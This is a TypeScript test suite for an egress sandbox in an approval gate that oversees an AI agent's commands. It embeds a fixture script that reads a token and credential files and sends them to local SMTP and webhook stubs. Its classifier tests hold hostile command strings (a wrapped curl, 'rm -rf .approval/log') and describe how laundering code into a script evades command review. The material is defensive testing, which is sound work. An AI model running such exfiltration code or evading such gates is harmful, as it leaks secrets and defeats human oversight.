/**
 * The egress sandbox (APRV-193): the profile, the wiring, and the laundering
 * demonstration.
 *
 * ## What makes this suite mean something
 *
 * Every substantive case here is a PAIR. The laundered script runs twice, once
 * unsandboxed and once inside the profile, against listeners started by this
 * process, and the assertions are made on BOTH sides: the SMTP stub and the
 * webhook stub must actually receive the bytes in the control, and must receive
 * nothing at all in the sandboxed run. A suite that only asserted the failure
 * would pass with a profile that denies nothing on a machine where the stub
 * never started, and a suite that only asserted the success would pass with no
 * sandbox at all. The control is the half that makes the other half evidence.
 *
 * ## Why loopback stubs rather than the internet
 *
 * Because a test that reaches the internet is a test that fails in a tunnel and
 * a test that sends real mail is a test nobody may run twice. The stubs are an
 * SMTP-shaped listener and an HTTP-shaped listener on 127.0.0.1, and the
 * laundered script speaks enough of each protocol to get a message accepted.
 * That is a STRICTER demonstration than an external host, not a weaker one: the
 * profile denies loopback along with everything else, so the sandboxed leg is
 * refused even though the peer is on the same machine, three milliseconds away,
 * and definitely listening.
 *
 * ## Where it stands down
 *
 * On a platform with no mechanism (anything but macOS in this build) the
 * spawning cases skip with the reason the probe gave, and the pure cases — the
 * profile text, the posture table, the PATH resolution — run everywhere.
 */

import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { createServer as createTcpServer, type Server as TcpServer } from "node:net";
import { createServer as createHttpServer, type Server as HttpServer } from "node:http";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import { fileURLToPath } from "node:url";

import {
  DENY_ALL_EGRESS,
  credentialPathsFor,
  detectSandbox,
  resolveExecutable,
  sandboxPosture,
  sandboxRequired,
  seatbeltProfile,
  wrapForSandbox,
  type SandboxDetection,
} from "../src/core/sandbox.js";
import { classifyCommand } from "../src/core/command-class.js";
import { sandboxRequirement } from "../src/cli/hook.js";
import { runPayloadHash } from "../src/core/payload.js";

/** dist/tests/sandbox.test.js -> dist/src/cli/main.js */
const CLI_ENTRY = fileURLToPath(new URL("../src/cli/main.js", import.meta.url));

const scratch = realpathSync(mkdtempSync(join(tmpdir(), "approval-md-sandbox-")));
let counter = 0;

after(() => {
  rmSync(scratch, { recursive: true, force: true });
});

const FOUND: SandboxDetection = detectSandbox();
const SKIP = FOUND.available ? false : `no sandbox primitive here: ${FOUND.reason}`;

/** A secret that exists only inside this suite. */
const TOKEN = "aprv193-not-a-real-telegram-token";

// ===========================================================================
// The laundered code
// ===========================================================================

/**
 * The script an allowed command runs: exactly the laundering the task is about.
 *
 * It is an ordinary `node` script in the workspace, which is what makes the
 * point. `node scripts/whatever.mjs` classifies `files.write.workspace` and the
 * policy allows it, and no classifier reading that command line can see the
 * four things below, because they are in a file the command line only names.
 */
const LAUNDERING_SCRIPT = `import { Socket } from "node:net";
import { request } from "node:http";
import { readFileSync } from "node:fs";

const [smtpPort, httpPort, vaultPath, envPath] = process.argv.slice(2);

function attempt(port) {
  return new Promise((resolve) => {
    const socket = new Socket();
    let settled = false;
    const done = (outcome, code) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve({ outcome, code });
    };
    socket.setTimeout(4000, () => done("timeout", null));
    socket.on("error", (error) => done("error", error.code ?? error.message));
    socket.connect(Number(port), "127.0.0.1", () => {
      // Enough SMTP to get a message accepted by the stub.
      socket.write("EHLO launderer\\r\\nMAIL FROM:<agent@example.invalid>\\r\\n");
      socket.write("RCPT TO:<exfil@example.invalid>\\r\\nDATA\\r\\n");
      socket.write("Subject: exfiltrated\\r\\n\\r\\n" + String(process.env.APPROVAL_TG_TOKEN) + "\\r\\n.\\r\\n");
      setTimeout(() => done("connected", null), 150);
    });
  });
}

function webhook(port) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ token: process.env.APPROVAL_TG_TOKEN ?? null });
    const req = request(
      { host: "127.0.0.1", port: Number(port), method: "POST", path: "/exfil", timeout: 4000 },
      (res) => {
        res.resume();
        res.on("end", () => resolve({ outcome: "connected", code: res.statusCode }));
      },
    );
    req.on("error", (error) => resolve({ outcome: "error", code: error.code ?? error.message }));
    req.on("timeout", () => { req.destroy(); resolve({ outcome: "timeout", code: null }); });
    req.end(body);
  });
}

function read(path) {
  try {
    return { ok: true, bytes: readFileSync(path, "utf8").length };
  } catch (error) {
    return { ok: false, code: error.code ?? String(error) };
  }
}

const verdict = {
  smtp: await attempt(smtpPort),
  webhook: await webhook(httpPort),
  env: process.env.APPROVAL_TG_TOKEN ?? null,
  vault: read(vaultPath),
  envFile: read(envPath),
};
console.log(JSON.stringify(verdict));
`;

interface Verdict {
  readonly smtp: { outcome: string; code: string | number | null };
  readonly webhook: { outcome: string; code: string | number | null };
  readonly env: string | null;
  readonly vault: { ok: boolean; bytes?: number; code?: string };
  readonly envFile: { ok: boolean; bytes?: number; code?: string };
}

// ===========================================================================
// The listeners the laundered code aims at
// ===========================================================================

interface Stubs {
  readonly smtpPort: number;
  readonly httpPort: number;
  /** Everything the SMTP stub was told, concatenated. */
  smtp: string;
  /** Every body the webhook stub was posted. */
  webhook: string[];
  close: () => Promise<void>;
}

async function startStubs(): Promise<Stubs> {
  const state = { smtp: "", webhook: [] as string[] };
  const smtpServer: TcpServer = createTcpServer((socket) => {
    socket.write("220 stub ESMTP\r\n");
    socket.on("data", (chunk) => {
      state.smtp += chunk.toString("utf8");
      socket.write("250 OK\r\n");
    });
    socket.on("error", () => undefined);
  });
  const httpServer: HttpServer = createHttpServer((req, res) => {
    let body = "";
    req.on("data", (chunk) => {
      body += String(chunk);
    });
    req.on("end", () => {
      state.webhook.push(body);
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("ok");
    });
  });
  await Promise.all([
    new Promise<void>((resolve) => smtpServer.listen(0, "127.0.0.1", resolve)),
    new Promise<void>((resolve) => httpServer.listen(0, "127.0.0.1", resolve)),
  ]);
  const smtpAddress = smtpServer.address();
  const httpAddress = httpServer.address();
  if (typeof smtpAddress === "string" || smtpAddress === null) throw new Error("no SMTP port");
  if (typeof httpAddress === "string" || httpAddress === null) throw new Error("no HTTP port");
  return {
    smtpPort: smtpAddress.port,
    httpPort: httpAddress.port,
    get smtp() {
      return state.smtp;
    },
    get webhook() {
      return state.webhook;
    },
    close: async () => {
      await Promise.all([
        new Promise<void>((resolve) => smtpServer.close(() => resolve())),
        new Promise<void>((resolve) => httpServer.close(() => resolve())),
      ]);
    },
  };
}

// ===========================================================================
// A workspace with credential material in it
// ===========================================================================

interface Workspace {
  readonly dir: string;
  readonly script: string;
  readonly vault: string;
  readonly envFile: string;
}

/** A directory holding the laundered script and a plausible approval home. */
function workspace(): Workspace {
  counter += 1;
  const dir = join(scratch, `case-${String(counter)}`);
  mkdirSync(join(dir, ".approval", "log"), { recursive: true });
  mkdirSync(join(dir, ".approval", "keys"), { recursive: true });
  const script = join(dir, "launder.mjs");
  writeFileSync(script, LAUNDERING_SCRIPT, "utf8");
  const vault = join(dir, ".approval", "vault.enc");
  const envFile = join(dir, ".approval", "env");
  writeFileSync(vault, "ciphertext-that-should-not-be-readable", "utf8");
  writeFileSync(envFile, "APPROVAL_TG_TOKEN=keychain:approval-telegram-token\n", "utf8");
  return { dir, script, vault, envFile };
}

function launderArgs(space: Workspace, stubs: Stubs): string[] {
  return [
    space.script,
    String(stubs.smtpPort),
    String(stubs.httpPort),
    space.vault,
    space.envFile,
  ];
}

interface Ran {
  code: number;
  stdout: string;
  stderr: string;
}

/**
 * Spawn ASYNCHRONOUSLY, and this is not a style preference.
 *
 * The stub listeners live in THIS process, so a `spawnSync` would block the
 * event loop that has to accept their connections. The kernel completes the
 * handshake from the listen backlog either way, so the child would still report
 * "connected" — and the servers would never see a byte, which would quietly
 * turn the strongest assertion in this file ("the stub received the token")
 * into one that could not pass. Measured before it was believed: under
 * `spawnSync` the same script connects and the stub's buffer stays empty.
 */
function run(
  command: string,
  args: string[],
  cwd: string,
  env: Record<string, string> = {},
): Promise<Ran> {
  return new Promise((resolve) => {
    const child = spawn(command, args, { cwd, env: { ...process.env, ...env } });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk) => {
      stdout += String(chunk);
    });
    child.stderr.on("data", (chunk) => {
      stderr += String(chunk);
    });
    child.on("error", (error) => resolve({ code: -1, stdout, stderr: `${stderr}${error.message}` }));
    child.on("close", (code) => resolve({ code: code ?? -1, stdout, stderr }));
  });
}

function verdictOf(ran: Ran): Verdict {
  const line = ran.stdout.trim().split("\n").at(-1) ?? "";
  return JSON.parse(line) as Verdict;
}

function cli(args: string[], cwd: string, env: Record<string, string> = {}): Promise<Ran> {
  return run(process.execPath, [CLI_ENTRY, ...args], cwd, env);
}

/** The gate verbs a fixture runs, where blocking this process costs nothing. */
function cliSync(args: string[], cwd: string, env: Record<string, string> = {}): Ran {
  const result = spawnSync(process.execPath, [CLI_ENTRY, ...args], {
    cwd,
    encoding: "utf8",
    env: { ...process.env, ...env },
    timeout: 60_000,
  });
  return { code: result.status ?? -1, stdout: result.stdout ?? "", stderr: result.stderr ?? "" };
}

// ===========================================================================
// The profile, as text. Everywhere.
// ===========================================================================

test("the profile denies outbound network and excepts unix sockets", () => {
  const profile = seatbeltProfile(DENY_ALL_EGRESS);
  assert.match(profile, /^\(version 1\)$/mu);
  assert.match(profile, /^\(allow default\)$/mu);
  assert.match(profile, /^\(deny network-outbound\)$/mu);
  // The exception that is not optional: Seatbelt counts an AF_UNIX connect as
  // `network-outbound`, so a profile without this kills local IPC and the
  // process dies before it can prove anything at all.
  assert.match(profile, /\(allow network-outbound \(regex #"\^\/"\)\)/u);
  // Loopback is denied WITH the rest by default: the gate's IPC is a file, so
  // there is no socket to except.
  assert.equal(profile.includes("localhost"), false);
});

test("loopback is a carve-out and never the default", () => {
  const carved = seatbeltProfile({ loopback: true, denyRead: [] });
  assert.match(carved, /\(allow network-outbound \(remote ip "localhost:\*"\)\)/u);
});

test("every denied path is written into the profile RESOLVED", () => {
  const space = workspace();
  const profile = seatbeltProfile({ loopback: false, denyRead: [space.vault] });
  // `scratch` is realpath'd, so this asserts the shape rather than the machine:
  // the profile must name a path with no symlink left in it, because Seatbelt
  // matches the kernel's resolved path and a profile naming the other spelling
  // denies nothing at all and reports no error.
  assert.match(profile, /\(deny file-read\* \(literal "/u);
  assert.equal(profile.includes(realpathSync(space.vault)), true);
});

test("the credential paths are the vault, the env map and the sealing keys", () => {
  const paths = credentialPathsFor("/x/.approval/log/events.jsonl");
  assert.deepEqual(paths, ["/x/.approval/vault.enc", "/x/.approval/env", "/x/.approval/keys"]);
});

// ===========================================================================
// Detection and the posture table: pure, and everywhere
// ===========================================================================

test("a platform with no mechanism is UNSUPPORTED rather than broken", () => {
  const found = detectSandbox({ platform: "linux", env: {} });
  assert.equal(found.available, false);
  assert.equal(found.supported, false);
  assert.match(found.reason, /linux/u);
  assert.match(found.reason, /follow-up/u);
});

test("the force override is a strictness increase, and says so plainly", () => {
  const forced = detectSandbox({ env: { APPROVAL_SANDBOX_FORCE_UNAVAILABLE: "1" } });
  assert.equal(forced.available, false);
  // `supported: true` — the mechanism is not claimed to be absent, only refused,
  // so the posture below REFUSES rather than proceeding unprotected.
  assert.equal(forced.supported, true);
});

test("the posture table: a broken mechanism refuses even under --no-sandbox", () => {
  const broken: SandboxDetection = {
    available: false,
    supported: true,
    mechanism: null,
    loopback: false,
    reason: "refused a trivial profile",
  };
  assert.equal(sandboxPosture({ optedOut: false, granted: false, detection: broken }).kind, "refuse");
  // The order is the policy: an opt-out is a decision about a working sandbox,
  // not a way to silence a broken one.
  assert.equal(sandboxPosture({ optedOut: true, granted: false, detection: broken }).kind, "refuse");
  assert.equal(sandboxPosture({ optedOut: false, granted: true, detection: broken }).kind, "refuse");
});

test("the posture table: unsupported proceeds and is recorded, unless required", () => {
  const absent: SandboxDetection = {
    available: false,
    supported: false,
    mechanism: null,
    loopback: false,
    reason: "no mechanism for platform \"win32\"",
  };
  assert.deepEqual(sandboxPosture({ optedOut: false, granted: false, detection: absent }), {
    kind: "skip",
    state: "unsupported",
  });
  assert.equal(
    sandboxPosture({ optedOut: false, granted: false, detection: absent, requireSupported: true })
      .kind,
    "refuse",
  );
});

test("the posture table: a token opens the door, an opt-out is named", () => {
  const working: SandboxDetection = {
    available: true,
    supported: true,
    mechanism: "sandbox-exec",
    loopback: true,
    reason: "",
  };
  assert.deepEqual(sandboxPosture({ optedOut: false, granted: false, detection: working }), {
    kind: "apply",
    state: "egress-denied",
    mechanism: "sandbox-exec",
  });
  assert.deepEqual(sandboxPosture({ optedOut: false, granted: true, detection: working }), {
    kind: "skip",
    state: "granted-egress",
  });
  assert.deepEqual(sandboxPosture({ optedOut: true, granted: false, detection: working }), {
    kind: "skip",
    state: "opted-out",
  });
});

test("sandboxRequired reads only the one variable, and only as `1`", () => {
  assert.equal(sandboxRequired({}), false);
  assert.equal(sandboxRequired({ APPROVAL_SANDBOX_REQUIRED: "0" }), false);
  assert.equal(sandboxRequired({ APPROVAL_SANDBOX_REQUIRED: "yes" }), false);
  assert.equal(sandboxRequired({ APPROVAL_SANDBOX_REQUIRED: "1" }), true);
});

test("resolveExecutable answers what execvp would, and null when it cannot", () => {
  assert.equal(resolveExecutable("definitely-not-a-binary-aprv193", { PATH: "/usr/bin:/bin" }), null);
  assert.equal(resolveExecutable("/bin/cat", {}), "/bin/cat");
  assert.equal(resolveExecutable("/bin/does-not-exist", {}), null);
  // First PATH entry wins. The order is /bin first because merged-/usr Linux
  // (Ubuntu runners) has /usr/bin/cat too, and the test pins the walk, not the OS.
  assert.equal(resolveExecutable("cat", { PATH: "/bin:/usr/bin" }), "/bin/cat");
  // No PATH is not "search the whole disk": it is a lookup that cannot be done.
  assert.equal(resolveExecutable("cat", {}), null);
});

// ===========================================================================
// The classifier: a wrapper is a room, and the class belongs to what runs in it
// ===========================================================================

test("`approval sandbox -- <cmd>` classifies as <cmd>, never as the gate itself", () => {
  const wrapped = classifyCommand("approval sandbox -- npm install left-pad");
  assert.equal(wrapped.ok, true);
  if (!wrapped.ok) return;
  assert.deepEqual(wrapped.classes, ["deps.add"]);
  assert.equal(wrapped.segments[0]?.sandbox, "runtime");

  // The hole this closes: without the unwrapping, the wrapper's own row answers
  // `gate.self` (the pass-through pseudo-class), so wrapping ANYTHING would
  // have made it unapprovable-and-allowed. The flag-before-the-verb spelling is
  // pinned too, because that is the one an agent would reach for.
  const sneaky = classifyCommand("approval --log /tmp/x sandbox -- curl https://example.com");
  assert.equal(sneaky.ok, true);
  if (!sneaky.ok) return;
  assert.deepEqual(sneaky.classes, ["read.web"]);
});

test("a wrapper never softens a refusal", () => {
  const opaque = classifyCommand("approval sandbox -- bash -c 'curl https://example.com'");
  assert.equal(opaque.ok, false);
  if (opaque.ok) return;
  assert.equal(opaque.code, "opaque");

  const protectedPath = classifyCommand("approval sandbox -- rm -rf .approval/log");
  assert.equal(protectedPath.ok, true);
  if (!protectedPath.ok) return;
  assert.deepEqual(protectedPath.classes, ["log.mutate"]);
});

test("a sandbox-exec form the rule cannot read in full is unclassified", () => {
  // Before this task, EVERY sandbox-exec spelling was unclassified and denied,
  // so the hook penalised the safe form of a command it allowed unwrapped.
  const modelled = classifyCommand("sandbox-exec -f /tmp/p.sb npm test");
  assert.equal(modelled.ok, true);
  if (!modelled.ok) return;
  assert.deepEqual(modelled.classes, ["files.write.workspace"]);
  // …and it is marked `external`, because the PROFILE is the caller's.
  assert.equal(modelled.segments[0]?.sandbox, "external");

  for (const guess of [
    "sandbox-exec -p '(version 1)(allow default)' npm test",
    "sandbox-exec -n no-network npm test",
    "sandbox-exec -f /tmp/p.sb",
  ]) {
    const result = classifyCommand(guess);
    assert.equal(result.ok, false, `${guess} was read past the part that matters`);
    if (result.ok) continue;
    assert.equal(result.code, "unclassified");
  }
});

test("`approval sandbox` with nothing to run stays the gate's own CLI", () => {
  const help = classifyCommand("approval sandbox --help");
  assert.equal(help.ok, true);
  if (!help.ok) return;
  assert.deepEqual(help.classes, ["gate.self"]);
});

// ===========================================================================
// The hook's requirement (off by default)
// ===========================================================================

function segmentsOf(command: string) {
  const result = classifyCommand(command);
  assert.equal(result.ok, true, command);
  return result.ok ? result.segments : [];
}

test("the hook requires nothing unless the operator turned it on", () => {
  const segments = segmentsOf("npm test");
  assert.equal(sandboxRequirement(segments, ["autonomous"], {}), null);
  assert.equal(sandboxRequirement(segments, ["autonomous"], { APPROVAL_HOOK_REQUIRE_SANDBOX: "0" }), null);
});

test("with it on, unwrapped code execution is denied and the fix is named", () => {
  const env = { APPROVAL_HOOK_REQUIRE_SANDBOX: "1" };
  const detail = sandboxRequirement(segmentsOf("npm test"), ["autonomous"], env);
  assert.notEqual(detail, null);
  assert.match(detail ?? "", /approval sandbox -- <command>/u);

  // The wrapped spelling passes, and a hand-written profile does NOT: a
  // requirement a caller can meet by writing their own permission is not one.
  assert.equal(sandboxRequirement(segmentsOf("approval sandbox -- npm test"), ["autonomous"], env), null);
  assert.notEqual(
    sandboxRequirement(segmentsOf("sandbox-exec -f /tmp/mine.sb npm test"), ["autonomous"], env),
    null,
  );

  // A command that runs no code of ours is not asked to wear a room, and a
  // manual command is going to a human, whose grant is the authority to reach
  // the world.
  assert.equal(sandboxRequirement(segmentsOf("mkdir build"), ["supervised"], env), null);
  assert.equal(sandboxRequirement(segmentsOf("npm test"), ["manual"], env), null);
  assert.equal(sandboxRequirement(undefined, ["autonomous"], env), null);
});

// ===========================================================================
// THE LAUNDERING DEMONSTRATION
// ===========================================================================

test("laundered code reaches BOTH stubs unsandboxed: the control", { skip: SKIP }, async () => {
  const stubs = await startStubs();
  const space = workspace();
  try {
    const ran = await run(process.execPath, launderArgs(space, stubs), space.dir, {
      APPROVAL_TG_TOKEN: TOKEN,
    });
    assert.equal(ran.code, 0, ran.stderr);
    const verdict = verdictOf(ran);

    // This is today's behaviour, and it is the whole reason for the task: an
    // ordinary `node script.mjs` — allowed, unremarkable, classified by a name
    // that says "workspace write" — sends mail and posts a webhook, carrying a
    // credential it read out of its own environment.
    assert.equal(verdict.smtp.outcome, "connected");
    assert.equal(verdict.webhook.outcome, "connected");
    assert.equal(verdict.env, TOKEN);
    assert.equal(verdict.vault.ok, true);
    assert.equal(verdict.envFile.ok, true);

    // Asserted at the LISTENER, not only at the sender: the bytes arrived.
    assert.match(stubs.smtp, /RCPT TO:<exfil@example\.invalid>/u);
    assert.match(stubs.smtp, new RegExp(TOKEN, "u"));
    assert.equal(stubs.webhook.length, 1);
    assert.match(stubs.webhook[0] ?? "", new RegExp(TOKEN, "u"));
  } finally {
    await stubs.close();
  }
});

test("under the profile the same code reaches neither, and the stubs hear nothing", { skip: SKIP }, async () => {
  const stubs = await startStubs();
  const space = workspace();
  try {
    const wrapped = wrapForSandbox("sandbox-exec", process.execPath, launderArgs(space, stubs), {
      loopback: false,
      denyRead: credentialPathsFor(join(space.dir, ".approval", "log", "events.jsonl")),
    });
    const ran = await run(wrapped.command, wrapped.args, space.dir, { APPROVAL_TG_TOKEN: TOKEN });
    rmSync(wrapped.cleanup, { recursive: true, force: true });
    assert.equal(ran.code, 0, ran.stderr);
    const verdict = verdictOf(ran);

    // DENIED, not slow: the peer is on this machine and definitely listening,
    // so a timeout here would mean the profile did nothing and the stub had
    // gone away. EPERM is the kernel refusing the socket.
    assert.equal(verdict.smtp.outcome, "error", JSON.stringify(verdict.smtp));
    assert.equal(verdict.smtp.code, "EPERM");
    assert.equal(verdict.webhook.outcome, "error", JSON.stringify(verdict.webhook));
    assert.equal(verdict.webhook.code, "EPERM");

    // Credential starvation, the filesystem half: the vault's ciphertext and
    // the environment source map are unreadable to the child even though it
    // runs as the same user in the same directory.
    assert.equal(verdict.vault.ok, false);
    assert.equal(verdict.vault.code, "EPERM");
    assert.equal(verdict.envFile.ok, false);
    assert.equal(verdict.envFile.code, "EPERM");

    // And nothing arrived. This is the assertion the whole file exists for.
    assert.equal(stubs.smtp, "", "the SMTP stub received bytes from a sandboxed child");
    assert.deepEqual(stubs.webhook, [], "the webhook stub received a POST from a sandboxed child");
  } finally {
    await stubs.close();
  }
});

test("`approval sandbox --` is the same room, through the CLI", { skip: SKIP }, async () => {
  const stubs = await startStubs();
  const space = workspace();
  try {
    const ran = await cli(
      ["sandbox", "--log", join(space.dir, ".approval", "log", "events.jsonl"), "--", process.execPath, ...launderArgs(space, stubs)],
      space.dir,
      { APPROVAL_TG_TOKEN: TOKEN },
    );
    assert.equal(ran.code, 0, ran.stderr);
    const verdict = verdictOf(ran);
    assert.equal(verdict.smtp.code, "EPERM");
    assert.equal(verdict.webhook.code, "EPERM");
    // Credential starvation, the environment half (APRV-205's scrub, applied
    // here too): the child does not hold the token, so there is nothing to
    // exfiltrate even where a door exists.
    assert.equal(verdict.env, null);
    assert.equal(stubs.smtp, "");
    assert.deepEqual(stubs.webhook, []);
    // The log is untouched: this verb appends nothing.
    assert.equal(existsSync(join(space.dir, ".approval", "log", "events.jsonl")), false);
  } finally {
    await stubs.close();
  }
});

test("`approval sandbox --allow-loopback` is a real widening, and only that", { skip: SKIP }, async () => {
  const stubs = await startStubs();
  const space = workspace();
  try {
    const ran = await cli(
      ["sandbox", "--allow-loopback", "--", process.execPath, ...launderArgs(space, stubs)],
      space.dir,
    );
    assert.equal(ran.code, 0, ran.stderr);
    const verdict = verdictOf(ran);
    assert.equal(verdict.smtp.outcome, "connected");
    assert.equal(verdict.webhook.outcome, "connected");
    // The carve-out exists for a suite that starts its own server. It is named
    // in `docs/sandboxed-exec.md` as what it is: a port is a port.
  } finally {
    await stubs.close();
  }
});

test("`approval sandbox` is transparent about exit codes and refuses without a command", { skip: SKIP }, async () => {
  const space = workspace();
  const seven = await cli(["sandbox", "--", "/bin/sh", "-c", "exit 7"], space.dir);
  assert.equal(seven.code, 7);

  const nothing = await cli(["sandbox"], space.dir);
  assert.equal(nothing.code, 2);
  assert.match(nothing.stderr, /missing command/u);

  const missing = await cli(["sandbox", "--", "definitely-not-a-binary-aprv193"], space.dir);
  assert.equal(missing.code, 127);
  assert.match(missing.stderr, /not on PATH/u);
  assert.match(missing.stderr, /NOT run/u);
});

test("with no sandbox, `approval sandbox` runs NOTHING", async () => {
  // Forced on every platform, because this is the line the whole design fails
  // open at if it is written the other way round.
  const space = workspace();
  const witness = join(space.dir, "the-command-ran");
  const ran = await cli(["sandbox", "--", "/usr/bin/touch", witness], space.dir, {
    APPROVAL_SANDBOX_FORCE_UNAVAILABLE: "1",
  });
  assert.equal(ran.code, 127);
  assert.match(ran.stderr, /no egress sandbox on this machine/u);
  assert.match(ran.stderr, /NOT run/u);
  assert.equal(existsSync(witness), false, "the command ran anyway: the sandbox failed OPEN");
});

// ===========================================================================
// `approval run`: the wiring, and the record it leaves
// ===========================================================================

const POLICY = [
  "# Policy",
  "",
  "```yaml approval-policy",
  'version: "0.1"',
  "defaults:",
  "  autonomy: manual",
  '  approval_ttl: "1h"',
  "  on_expiry: reject",
  "classes:",
  "  files.write.*:",
  "    autonomy: supervised",
  "budgets:",
  "  global:",
  "    daily_usd: 10",
  "    daily_actions: 50",
  "```",
  "",
].join("\n");

function taskFile(binding: string): string {
  return [
    "---",
    "id: task-193",
    "title: Run the laundered script",
    "status: In Progress",
    "approval:",
    "  origin:",
    "    app: aprv-193",
    '    created_by: "human:carter"',
    "  state: proposed",
    "  actions:",
    "    - class: files.write.local",
    '      summary: "Run the workspace script"',
    "      reversible: true",
    '      est_cost_usd: "0.01"',
    '      idempotency_key: "task-193:launder"',
    `      payload_hash: "${binding}"`,
    "---",
    "",
    "## Description",
    "Body.",
    "",
  ].join("\n");
}

/** A gate-ready workspace whose one supervised action runs the laundered script. */
function gated(space: Workspace, childArgv: string[]): void {
  writeFileSync(join(space.dir, "APPROVAL.md"), POLICY, "utf8");
  writeFileSync(
    join(space.dir, "task-193.md"),
    taskFile(runPayloadHash(childArgv, space.dir)),
    "utf8",
  );
  assert.equal(cliSync(["policy", "attest", "--as", "human:carter"], space.dir).code, 0);
  assert.equal(cliSync(["register", "task-193.md", "--as", "agent:claude"], space.dir).code, 0);
}

function startedPayload(space: Workspace): Record<string, unknown> {
  const lines = readFileSync(join(space.dir, ".approval", "log", "events.jsonl"), "utf8")
    .split("\n")
    .filter((line) => line.trim().length > 0)
    .map((line) => JSON.parse(line) as Record<string, unknown>);
  const started = lines.filter((record) => record["event"] === "execution.started").at(-1);
  assert.notEqual(started, undefined, "no execution.started in the log");
  return (started?.["payload"] ?? {}) as Record<string, unknown>;
}

test("`approval run` starves an untokened child, and the record says so", { skip: SKIP }, async () => {
  const stubs = await startStubs();
  const space = workspace();
  try {
    const argv = [process.execPath, ...launderArgs(space, stubs)];
    gated(space, argv);
    const ran = await cli(
      ["run", "task-193:launder", "--as", "agent:claude", "--", ...argv],
      space.dir,
      { APPROVAL_TG_TOKEN: TOKEN },
    );
    assert.equal(ran.code, 0, ran.stderr);
    const verdict = verdictOf(ran);
    assert.equal(verdict.smtp.code, "EPERM");
    assert.equal(verdict.webhook.code, "EPERM");
    assert.equal(verdict.env, null, "APRV-205's scrub stopped applying");
    assert.equal(stubs.smtp, "");
    assert.deepEqual(stubs.webhook, []);

    const payload = startedPayload(space);
    assert.equal(payload["sandbox"], "egress-denied");
    assert.equal(typeof payload["env_stripped"], "number");

    const verify = cliSync(["log", "verify", "--json"], space.dir);
    assert.equal(verify.code, 0, verify.stderr);
  } finally {
    await stubs.close();
  }
});

test("`--no-sandbox` works, and is RECORDED as having been taken", { skip: SKIP }, async () => {
  const stubs = await startStubs();
  const space = workspace();
  try {
    const argv = [process.execPath, ...launderArgs(space, stubs)];
    gated(space, argv);
    const ran = await cli(
      ["run", "task-193:launder", "--as", "agent:claude", "--no-sandbox", "--", ...argv],
      space.dir,
    );
    assert.equal(ran.code, 0, ran.stderr);
    const verdict = verdictOf(ran);
    assert.equal(verdict.smtp.outcome, "connected");
    assert.equal(verdict.webhook.outcome, "connected");

    // The opt-out is in the log. That is the whole difference between a
    // control an operator may take and a control that quietly does not apply.
    assert.equal(startedPayload(space)["sandbox"], "opted-out");
    assert.equal(cliSync(["log", "verify", "--json"], space.dir).code, 0);
  } finally {
    await stubs.close();
  }
});

test("a machine whose sandbox is broken runs nothing and appends nothing", { skip: SKIP }, () => {
  const space = workspace();
  const witness = join(space.dir, "the-command-ran");
  const argv = ["/usr/bin/touch", witness];
  gated(space, argv);
  const before = readFileSync(join(space.dir, ".approval", "log", "events.jsonl"), "utf8");

  const ran = cliSync(["run", "task-193:launder", "--as", "agent:claude", "--", ...argv], space.dir, {
    APPROVAL_SANDBOX_FORCE_UNAVAILABLE: "1",
  });
  assert.equal(ran.code, 127);
  assert.match(ran.stderr, /egress sandbox is unavailable/u);
  assert.equal(existsSync(witness), false, "the command ran anyway: the wiring failed OPEN");
  assert.equal(
    readFileSync(join(space.dir, ".approval", "log", "events.jsonl"), "utf8"),
    before,
    "a refusal before the spawn must append nothing: the same token still spends later",
  );
});
